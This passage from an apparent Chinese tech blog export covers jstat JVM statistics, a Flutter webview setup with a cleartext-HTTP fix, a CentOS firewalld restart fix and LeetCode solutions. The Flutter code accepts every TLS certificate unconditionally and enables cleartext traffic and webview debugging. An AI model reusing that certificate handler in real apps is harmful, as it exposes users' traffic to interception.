&lt;option&gt;      An option reported by the -options option</span><br><span class="line">  &lt;vmid&gt;        Virtual Machine Identifier. A vmid takes the following form:</span><br><span class="line">                     &lt;lvmid&gt;[@&lt;hostname&gt;[:&lt;port&gt;]]</span><br><span class="line">                Where &lt;lvmid&gt; is the <span class="built_in">local</span> vm identifier <span class="keyword">for</span> the target</span><br><span class="line">                Java virtual machine, typically a process id; &lt;hostname&gt; is</span><br><span class="line">                the name of the host running the target Java virtual machine;</span><br><span class="line">                and &lt;port&gt; is the port number <span class="keyword">for</span> the rmiregistry on the</span><br><span class="line">                target host. See the jvmstat documentation <span class="keyword">for</span> a more complete</span><br><span class="line">                description of the Virtual Machine Identifier.</span><br><span class="line">  &lt;lines&gt;       Number of samples between header lines.</span><br><span class="line">  &lt;interval&gt;    Sampling interval. The following forms are allowed:</span><br><span class="line">                    &lt;n&gt;[<span class="string">"ms"</span>|<span class="string">"s"</span>]</span><br><span class="line">                Where &lt;n&gt; is an <span class="built_in">integer</span> and the suffix specifies the units as</span><br><span class="line">                milliseconds(<span class="string">"ms"</span>) or seconds(<span class="string">"s"</span>). The default units are <span class="string">"ms"</span>.</span><br><span class="line">  &lt;count&gt;       Number of samples to take before terminating.</span><br><span class="line">  -J&lt;flag&gt;      Pass &lt;flag&gt; directly to the runtime system.</span><br><span class="line"></span><br><span class="line">[root@localhost ~]<span class="comment"># jstat -options</span></span><br><span class="line">-class</span><br><span class="line">-compiler</span><br><span class="line">-gc</span><br><span class="line">-gccapacity</span><br><span class="line">-gccause</span><br><span class="line">-gcmetacapacity</span><br><span class="line">-gcnew</span><br><span class="line">-gcnewcapacity</span><br><span class="line">-gcold</span><br><span class="line">-gcoldcapacity</span><br><span class="line">-gcutil</span><br><span class="line">-printcompilation</span><br></pre></td></tr></table></figure>
<h2 id="统计编译信息"><a href="#统计编译信息" class="headerlink" title="统计编译信息"></a>统计编译信息</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">[root@localhost ~]<span class="comment">#  jstat -compiler 4803</span></span><br><span class="line">Compiled Failed Invalid   Time   FailedType FailedMethod</span><br><span class="line">   18450      2       0   292.99          1 org/springframework/util/ConcurrentReferenceHashMap<span class="variable">$Segment</span> restructureIfNecessary</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>Compiled：编译数量。</li>
<li>Failed：失败数量</li>
<li>Invalid：不可用数量</li>
<li>Time：时间</li>
<li>FailedType：失败类型</li>
<li>FailedMethod：失败的方法</li>
</ul>
</blockquote>
<h2 id="统计-GC-信息"><a href="#统计-GC-信息" class="headerlink" title="统计 GC 信息"></a>统计 GC 信息</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># jstat -gc 4803 250 10</span></span><br><span class="line"></span><br><span class="line"> S0C    S1C    S0U    S1U      EC       EU        OC         OU       MC     MU    CCSC   CCSU   YGC     YGCT    FGC    FGCT     GCT</span><br><span class="line">6464.0 6464.0  0.0    0.0   51904.0  13873.2   129364.0   69903.3   89472.0 84206.7 9856.0 8857.8   1526    9.749  10      2.029   11.7                           78</span><br><span class="line">6464.0 6464.0  0.0    0.0   51904.0  13873.2   129364.0   69903.3   89472.0 84206.7 9856.0 8857.8   1526    9.749  10      2.029   11.7                           78</span><br><span class="line">6464.0 6464.0  0.0    0.0   51904.0  13873.2   129364.0   69903.3   89472.0 84206.7 9856.0 8857.8   1526    9.749  10      2.029   11.7                           78</span><br><span class="line">6464.0 6464.0  0.0    0.0   51904.0  13873.2   129364.0   69903.3   89472.0 84206.7 9856.0 8857.8   1526    9.749  10      2.029   11.7                           78</span><br><span class="line">6464.0 6464.0  0.0    0.0   51904.0  13873.2   129364.0   69903.3   89472.0 84206.7 9856.0 8857.8   1526    9.749  10      2.029   11.7                           78</span><br><span class="line">6464.0 6464.0  0.0    0.0   51904.0  13873.2   129364.0   69903.3   89472.0 84206.7 9856.0 8857.8   1526    9.749  10      2.029   11.7                           78</span><br><span class="line">6464.0 6464.0  0.0    0.0   51904.0  13873.2   129364.0   69903.3   89472.0 84206.7 9856.0 8857.8   1526    9.749  10      2.029   11.7                           78</span><br><span class="line">6464.0 6464.0  0.0    0.0   51904.0  13873.2   129364.0   69903.3   89472.0 84206.7 9856.0 8857.8   1526    9.749  10      2.029   11.7                           78</span><br><span class="line">6464.0 6464.0  0.0    0.0   51904.0  13873.2   129364.0   69903.3   89472.0 84206.7 9856.0 8857.8   1526    9.749  10      2.029   11.7                           78</span><br><span class="line">6464.0 6464.0  0.0    0.0   51904.0  13873.2   129364.0   69903.3   89472.0 84206.7 9856.0 8857.8   1526    9.749  10      2.029   11.7                           78</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>S0C、S1C、S0U、S1U：Survivor 0/1 区容量（Capacity）和使用量（Used）</li>
<li>EC、EU：Eden 区容量和使用量</li>
<li>OC、OU：年老代容量和使用量</li>
<li>MC、MU：元数据区容量和使用量</li>
<li>CCSC、CCSU:压缩类空间容量和使用量</li>
<li>YGC、YGCT：年轻代 GC 次数和 GC 耗时</li>
<li>FGC、FGCT：Full GC 次数和 Full GC 耗时</li>
<li>GCT：GC 总耗时</li>
</ul>
</blockquote>
<h2 id="GC-统计信息"><a href="#GC-统计信息" class="headerlink" title="GC 统计信息"></a>GC 统计信息</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># jstat -gcutil 4803</span></span><br><span class="line">  S0     S1     E      O      M     CCS    YGC     YGCT    FGC    FGCT     GCT</span><br><span class="line">  0.00   0.00  49.91  54.04  94.12  89.87   1526    9.749    10    2.029   11.778</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>S0：S0 区当前使用比例</li>
<li>S1：S1 区当前使用比例</li>
<li>E： Eden 区使用比例</li>
<li>O：老年代使用比例</li>
<li>M：元数据区使用比例</li>
<li>CCS：压缩类空间使用百分比</li>
<li>YGC：年轻代垃圾回收次数</li>
<li>FGC：老年代垃圾回收次数</li>
<li>FGCT：老年代垃圾回收消耗时间</li>
<li>GCT：垃圾回收消耗总时间</li>
</ul>
</blockquote>
<p>此文到此算结束了,略显粗糙，如有错误欢迎批评指正。</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><a href="https://help.eclipse.org/neon/index.jsp?topic=%2Forg.eclipse.mat.ui.help%2Freference%2Foqlsyntax.html" target="_blank" rel="noopener">OQL 语法</a></li>
<li><a href="https://en.wikipedia.org/wiki/Object_Query_Language" target="_blank" rel="noopener">Object_Query_Language</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>jvm</tag>
      </tags>
  </entry>
  <entry>
    <title>Flutter集成webview出错,ERR_CLEARTEXT_NOT_PERMITTED</title>
    <url>/2021/08/28/mobile/android/flutter_webview/</url>
    <content><![CDATA[<p>在移动端开发的过程中，某些页面是一个H5,所以需要webview来渲染html。本文来记录一下过程和遇到的问题。</p>
<h1 id="集成步骤"><a href="#集成步骤" class="headerlink" title="集成步骤"></a>集成步骤</h1><p>flutter 集成选择的flutter_inappwebview插件。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">dependencies:</span></span><br><span class="line"><span class="attr">  flutter:</span></span><br><span class="line"><span class="attr">    sdk:</span> <span class="string">flutter</span></span><br><span class="line">  <span class="comment"># webview</span></span><br><span class="line"><span class="attr">  flutter_inappwebview:</span> <span class="string">^5.3.2</span></span><br></pre></td></tr></table></figure>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight dart"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">'dart:async'</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">'dart:io'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">'package:driver/config/Util.dart'</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">'package:flutter/material.dart'</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">'package:flutter_inappwebview/flutter_inappwebview.dart'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 关于我们.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @author xwolf</span></span><br><span class="line"><span class="comment"> * @date 2021-08-23</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">About</span> <span class="keyword">extends</span> <span class="title">StatefulWidget</span> </span>&#123;</span><br><span class="line">  <span class="meta">@override</span></span><br><span class="line">  State&lt;StatefulWidget&gt; createState() =&gt; _About();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">_About</span> <span class="keyword">extends</span> <span class="title">State</span>&lt;<span class="title">About</span>&gt; </span>&#123;</span><br><span class="line">  <span class="meta">@override</span></span><br><span class="line">  <span class="keyword">void</span> initState() &#123;</span><br><span class="line">    <span class="keyword">super</span>.initState();</span><br><span class="line">    _initWebView();</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">/// 初始化webview</span></span><br><span class="line">  Future&lt;<span class="keyword">void</span>&gt; _initWebView() <span class="keyword">async</span> &#123;</span><br><span class="line">    WidgetsFlutterBinding.ensureInitialized();</span><br><span class="line">    <span class="keyword">if</span> (Platform.isAndroid) &#123;</span><br><span class="line">      <span class="keyword">await</span> AndroidInAppWebViewController.setWebContentsDebuggingEnabled(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">var</span> swAvailable = <span class="keyword">await</span> AndroidWebViewFeature.isFeatureSupported(</span><br><span class="line">          AndroidWebViewFeature.SERVICE_WORKER_BASIC_USAGE);</span><br><span class="line">      <span class="keyword">var</span> swInterceptAvailable = <span class="keyword">await</span> AndroidWebViewFeature.isFeatureSupported(</span><br><span class="line">          AndroidWebViewFeature.SERVICE_WORKER_SHOULD_INTERCEPT_REQUEST);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (swAvailable &amp;&amp; swInterceptAvailable) &#123;</span><br><span class="line">        AndroidServiceWorkerController serviceWorkerController =</span><br><span class="line">            AndroidServiceWorkerController.instance();</span><br><span class="line"></span><br><span class="line">        serviceWorkerController.serviceWorkerClient =</span><br><span class="line">            AndroidServiceWorkerClient(</span><br><span class="line">          shouldInterceptRequest: (request) <span class="keyword">async</span> &#123;</span><br><span class="line">            <span class="built_in">print</span>(request);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">          &#125;,</span><br><span class="line">        );</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@override</span></span><br><span class="line">  Widget build(BuildContext context) &#123;</span><br><span class="line">    <span class="keyword">return</span> Scaffold(</span><br><span class="line">        appBar: Util.createAppBar(<span class="string">"关于我们"</span>),</span><br><span class="line">        body: Padding(</span><br><span class="line">          padding: EdgeInsets.only(top: <span class="number">5</span>),</span><br><span class="line">          child: InAppWebView(</span><br><span class="line">            initialUrlRequest:</span><br><span class="line">                URLRequest(url: <span class="built_in">Uri</span>.parse(<span class="string">"http://www.baidu.com"</span>)),</span><br><span class="line">            onReceivedServerTrustAuthRequest:</span><br><span class="line">                (InAppWebViewController controller,</span><br><span class="line">                    URLAuthenticationChallenge challenge) <span class="keyword">async</span> &#123;</span><br><span class="line">              <span class="keyword">return</span> ServerTrustAuthResponse(</span><br><span class="line">                  action: ServerTrustAuthResponseAction.PROCEED);</span><br><span class="line">            &#125;,</span><br><span class="line">          ),</span><br><span class="line">        ));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>OK，模拟器打开正常显示。</p>
<h1 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h1><h1 id="一、ERR-CLEARTEXT-NOT-PERMITTED"><a href="#一、ERR-CLEARTEXT-NOT-PERMITTED" class="headerlink" title="一、ERR_CLEARTEXT_NOT_PERMITTED"></a>一、ERR_CLEARTEXT_NOT_PERMITTED</h1><p>flutter集成webview的时候的在模拟器上可以正常使用，但是在真机上页面显示了一个错误信息。</p>
<p><img src="/2021/08/28/mobile/android/flutter_webview/image-20210828073140306.png" alt="image-20210828073140306"></p>
<p>从Android 9.0（API级别28）开始，默认情况下禁用明文支持。因此http的url均无法在webview中加载。</p>
<h3 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h3><p>修改AndroidManifest.xml，在application节点下面加上 <code>android:usesCleartextTraffic=&quot;true&quot;</code></p>
<p>最终的效果:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">package</span>=<span class="string">"com.XX.XX.XX"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">application</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:label</span>=<span class="string">"fly"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:icon</span>=<span class="string">"@mipmap/ic_launcher"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:usesCleartextTraffic</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">        &gt;</span>          </span><br><span class="line">          </span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>重新打包，真机测试正常。</p>
]]></content>
      <categories>
        <category>flutter</category>
      </categories>
      <tags>
        <tag>flutter</tag>
      </tags>
  </entry>
  <entry>
    <title>Failed to start firewalld - dynamic firewall daemon</title>
    <url>/2018/12/14/linux/problem/firewalld%E5%90%AF%E5%8A%A8%E5%A4%B1%E8%B4%A5/</url>
    <content><![CDATA[<p>centos7启动防火墙失败,操作超时。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl start firewalld</span><br></pre></td></tr></table></figure>
<p>[root@bogon ~]# systemctl start firewalld<br>Job for firewalld.service failed because a timeout was exceeded. See “systemctl status firewalld.service” and “journalctl -xe” for details.</p>
<p>[root@bogon ~]# systemctl status firewalld<br>● firewalld.service - firewalld - dynamic firewall daemon<br>   Loaded: loaded t: enabled)<br>   Active:<font color="red"> failed (Result: timeout) </font> since 六 2018-12-15 00:54:55 CST; 42s ag(/usr/lib/systemd/system/firewalld.service; enabled; vendor preseo<br>     Docs: man:firewalld(1)<br>  Process: 14218 ExecStart=/usr/sbin/firewalld —nofork —nopid $FIREWALLD_ARGS (code=exited, status=0/SUCCESS)<br> Main PID: 14218 (code=exited, status=0/SUCCESS)</p>
<p>12月 15 00:53:23 bogon systemd[1]: Starting firewalld - dynamic firewall daemon…<br>12月 15 00:54:53 bogon systemd[1]: firewalld.service start operation timed out. Terminating.<br>12月 15 00:54:55 bogon systemd[1]: <font color="red">Failed to start firewalld - dynamic firewall daemon.</font><br>12月 15 00:54:55 bogon systemd[1]: Unit firewalld.service entered failed state.<br>12月 15 00:54:55 bogon systemd[1]: firewalld.service failed.</p>
<a id="more"></a>
<p>算是centos7的一个bug吧,<br>执行下面命令即可</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@bogon ~]<span class="comment"># systemctl stop firewalld;pkill -f firewalld;systemctl start firewalld</span></span><br></pre></td></tr></table></figure>
<p>查看防火墙状态</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@bogon ~]<span class="comment"># systemctl status firewalld</span></span><br><span class="line">● firewalld.service - firewalld - dynamic firewall daemon</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/firewalld.service; enabled; vendor preset: enabled)</span><br><span class="line">   Active: active (running) since 六 2018-12-15 00:56:19 CST; 11s ago</span><br><span class="line">     Docs: man:firewalld(1)</span><br><span class="line"> Main PID: 14638 (firewalld)</span><br><span class="line">    Tasks: 2</span><br><span class="line">   Memory: 21.6M</span><br><span class="line">   CGroup: /system.slice/firewalld.service</span><br><span class="line">           └─14638 /usr/bin/python -Es /usr/sbin/firewalld --nofork --nopid</span><br><span class="line"></span><br><span class="line">12月 15 00:56:20 bogon firewalld[14638]: WARNING: COMMAND_FAILED: <span class="string">'/usr/sbin/iptables -w2 -D FORWARD -i docker0 -o docker0 -j DROP'</span>...hain?).</span><br><span class="line">12月 15 00:56:21 bogon firewalld[14638]: WARNING: COMMAND_FAILED: <span class="string">'/usr/sbin/iptables -w2 -t nat -C DOCKER -p tcp -d 0/0 --dport 15...t name.</span></span><br><span class="line"><span class="string">12月 15 00:56:21 bogon firewalld[14638]: WARNING: COMMAND_FAILED: '</span>/usr/sbin/iptables -w2 -t filter -C DOCKER ! -i docker0 -o docke...hain?).</span><br><span class="line">12月 15 00:56:21 bogon firewalld[14638]: WARNING: COMMAND_FAILED: <span class="string">'/usr/sbin/iptables -w2 -t nat -C POSTROUTING -p tcp -s 172.17.0....t name.</span></span><br><span class="line"><span class="string">12月 15 00:56:21 bogon firewalld[14638]: WARNING: COMMAND_FAILED: '</span>/usr/sbin/iptables -w2 -t nat -C DOCKER -p tcp -d 0/0 --dport 56...t name.</span><br><span class="line">12月 15 00:56:21 bogon firewalld[14638]: WARNING: COMMAND_FAILED: <span class="string">'/usr/sbin/iptables -w2 -t filter -C DOCKER ! -i docker0 -o docke...hain?).</span></span><br><span class="line"><span class="string">12月 15 00:56:21 bogon firewalld[14638]: WARNING: COMMAND_FAILED: '</span>/usr/sbin/iptables -w2 -t nat -C POSTROUTING -p tcp -s 172.17.0....t name.</span><br><span class="line">12月 15 00:56:21 bogon firewalld[14638]: WARNING: COMMAND_FAILED: <span class="string">'/usr/sbin/iptables -w2 -t filter -n -L DOCKER-USER'</span> failed: ipta...t name.</span><br><span class="line">12月 15 00:56:21 bogon firewalld[14638]: WARNING: COMMAND_FAILED: <span class="string">'/usr/sbin/iptables -w2 -t filter -C DOCKER-USER -j RETURN'</span> faile...hain?).</span><br><span class="line">12月 15 00:56:21 bogon firewalld[14638]: WARNING: COMMAND_FAILED: <span class="string">'/usr/sbin/iptables -w2 -t filter -C FORWARD -j DOCKER-USER'</span> fail...t name.</span><br><span class="line">Hint: Some lines were ellipsized, use -l to show <span class="keyword">in</span> full.</span><br></pre></td></tr></table></figure>
<p><img src="/2018/12/14/linux/problem/firewalld启动失败/Firewalld.service Operation.png" alt="firewalld issue"></p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><a href="https://centosfaq.org/centos/centos-7-firewalldservice-operation-time-out-systemctl-firewalld-issues/" target="_blank" rel="noopener">CentOS 7: Firewalld.service Operation Time Out – Systemctl Firewalld Issues</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>67.Add Binary</title>
    <url>/2018/06/01/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/leetcode/Add%20Binary/</url>
    <content><![CDATA[<p>Given two binary strings, return their sum (also a binary string).<br>The input strings are both non-empty and contains only characters 1 or 0.<br>Example 1:<br>Input: a = “11”, b = “1”<br>Output: “100”<br>Example 2:<br>Input: a = “1010”, b = “1011”<br>Output: “10101”</p>
<blockquote>
<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1></blockquote>
<p>题意是两个二进制字符串,返回它们的和(仍然是二进制串).<br>二进制数字可能比较长,考虑到选择数据类型的范围.</p>
<blockquote>
<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><ul>
<li>scala 实现<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addBinary</span></span>(a: <span class="type">String</span>, b: <span class="type">String</span>): <span class="type">String</span> = &#123;</span><br><span class="line">    <span class="keyword">val</span> c = <span class="type">BigInt</span>(a,<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">val</span> d = <span class="type">BigInt</span>(b,<span class="number">2</span>)</span><br><span class="line">    (c + d).toString(<span class="number">2</span>)</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://leetcode.com/problems/add-binary" target="_blank" rel="noopener">Add Binary</a></li>
</ul>
</blockquote>
<h4 id="如有错误-欢迎批评指正-望不吝赐教"><a href="#如有错误-欢迎批评指正-望不吝赐教" class="headerlink" title="如有错误,欢迎批评指正,望不吝赐教!!!"></a>如有错误,欢迎批评指正,望不吝赐教!!!</h4>]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>415. Add Strings</title>
    <url>/2019/05/15/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/leetcode/Add%20Strings/</url>
    <content><![CDATA[<p>Given two non-negative integers num1 and num2 represented as string, return the sum of num1 and num2.</p>
<p>Note:</p>
<ol>
<li>The length of both num1 and num2 is &lt; 5100.</li>
<li>Both num1 and num2 contains only digits 0-9.</li>
<li>Both num1 and num2 does not contain any leading zero.</li>
<li>You must not use any built-in BigInteger library or convert the inputs to integer directly.</li>
</ol>
<a id="more"></a>
<h1 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h1><p>不使用内置 Int 类库，完成字符串的相加。</p>
<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><blockquote>
<ul>
<li>java</li>
</ul>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">addStrings</span><span class="params">(String num1, String num2)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(num1 == <span class="keyword">null</span> || num1.length() == <span class="number">0</span>) &#123;</span><br><span class="line">     <span class="keyword">return</span> num2;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span>(num2 == <span class="keyword">null</span> || num2.length() == <span class="number">0</span>) &#123;</span><br><span class="line">     <span class="keyword">return</span> num1;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">char</span>[] chAry = num1.toCharArray();</span><br><span class="line">   Stack&lt;Character&gt; aSk = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">   <span class="keyword">for</span>(Character a: chAry) &#123;</span><br><span class="line">     aSk.add(a);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">char</span>[] chBry = num2.toCharArray();</span><br><span class="line">   Stack&lt;Character&gt; bSk = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">   <span class="keyword">for</span>(Character b: chBry) &#123;</span><br><span class="line">     bSk.add(b);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">int</span> aLen = num1.length();</span><br><span class="line">   <span class="keyword">int</span> bLen = num2.length();</span><br><span class="line">   List&lt;Integer&gt; result = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">   <span class="keyword">int</span> temp = <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">while</span> (!aSk.isEmpty() || !bSk.isEmpty()) &#123;</span><br><span class="line">     <span class="keyword">char</span> a = <span class="string">'0'</span>;</span><br><span class="line">     <span class="keyword">if</span>(!aSk.isEmpty()) &#123;</span><br><span class="line">       a = aSk.pop();</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">char</span> b = <span class="string">'0'</span>;</span><br><span class="line">     <span class="keyword">if</span>(!bSk.isEmpty()) &#123;</span><br><span class="line">       b = bSk.pop();</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">int</span> res = a + b - <span class="number">96</span> + temp;</span><br><span class="line">     <span class="keyword">if</span> (res &gt;= <span class="number">10</span>)&#123;</span><br><span class="line">       temp = <span class="number">1</span>;</span><br><span class="line">       res = res - <span class="number">10</span>;</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       temp = <span class="number">0</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     result.add(res);</span><br><span class="line">   &#125;</span><br><span class="line">   StringBuilder build = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">   <span class="keyword">int</span> size = result.size();</span><br><span class="line">   <span class="comment">// the first two char's sum if &gt; 10</span></span><br><span class="line">   <span class="keyword">if</span> (temp == <span class="number">1</span>)&#123;</span><br><span class="line">     build.append(<span class="number">1</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">int</span> i= size - <span class="number">1</span> ; i &gt;= <span class="number">0</span> ; i--)&#123;</span><br><span class="line">     build.append(result.get(i));</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> build.toString();</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>讨论区其他答案</p>
<blockquote>
<ul>
<li>java</li>
</ul>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">addStrings</span><span class="params">(String num1, String num2)</span> </span>&#123;</span><br><span class="line">      StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">      <span class="keyword">int</span> carry = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">int</span> i = num1.length() - <span class="number">1</span>, j = num2.length() - <span class="number">1</span>; i &gt;= <span class="number">0</span> || j &gt;= <span class="number">0</span> || carry == <span class="number">1</span>; i--, j--)&#123;</span><br><span class="line">          <span class="keyword">int</span> x = i &lt; <span class="number">0</span> ? <span class="number">0</span> : num1.charAt(i) - <span class="string">'0'</span>;</span><br><span class="line">          <span class="keyword">int</span> y = j &lt; <span class="number">0</span> ? <span class="number">0</span> : num2.charAt(j) - <span class="string">'0'</span>;</span><br><span class="line">          sb.append((x + y + carry) % <span class="number">10</span>);</span><br><span class="line">          carry = (x + y + carry) / <span class="number">10</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> sb.reverse().toString();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><a href="https://leetcode.com/problems/add-strings/discuss/?currentPage=1&amp;orderBy=recent_activity&amp;query=" target="_blank" rel="noopener">add-strings</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>2. Add Two Numbers</title>
    <url>/2019/05/21/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/leetcode/Add%20Two%20Numbers/</url>
    <content><![CDATA[<p>You are given two non-empty linked lists representing two non-negative integers. The digits are stored in reverse order and each of their nodes contain a single digit. Add the two numbers and return it as a linked list.</p>
<p>You may assume the two numbers do not contain any leading zero, except the number 0 itself.<br>Example:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: (2 -&gt; 4 -&gt; 3) + (5 -&gt; 6 -&gt; 4)</span><br><span class="line">Output: 7 -&gt; 0 -&gt; 8</span><br><span class="line">Explanation: 342 + 465 = 807.</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h1 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h1><p>两个链表求和结果保存到一个翻转的链表中.</p>
<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><blockquote>
<ul>
<li>java</li>
</ul>
</blockquote>
<p>定义结果链表和一个指向该链表的引用 cur,cur 表示当前正在处理的结点.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">addTwoNumbers</span><span class="params">(ListNode p, ListNode q)</span></span>&#123;</span><br><span class="line">     ListNode result  = <span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">     <span class="keyword">int</span> big = <span class="number">0</span> ;</span><br><span class="line">     ListNode cur = result;</span><br><span class="line">     <span class="keyword">while</span>(p != <span class="keyword">null</span> || q != <span class="keyword">null</span>)&#123;</span><br><span class="line">       <span class="keyword">int</span> a  = p == <span class="keyword">null</span> ? <span class="number">0</span> : p.val;</span><br><span class="line">       <span class="keyword">int</span> b  = q == <span class="keyword">null</span> ? <span class="number">0</span> : q.val;</span><br><span class="line">       <span class="keyword">int</span> val = a + b + big;</span><br><span class="line">       <span class="keyword">if</span> (val &gt;= <span class="number">10</span>)&#123;</span><br><span class="line">         val -= <span class="number">10</span>;</span><br><span class="line">         big = <span class="number">1</span>;</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         big = <span class="number">0</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       ListNode  cld  = <span class="keyword">new</span> ListNode(val);</span><br><span class="line">       cur.next = cld;</span><br><span class="line">       cur = cur.next;</span><br><span class="line">       <span class="keyword">if</span> (p != <span class="keyword">null</span>)&#123;</span><br><span class="line">         p = p.next;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span> (q != <span class="keyword">null</span>)&#123;</span><br><span class="line">         q = q.next;</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br><span class="line">    <span class="keyword">if</span> 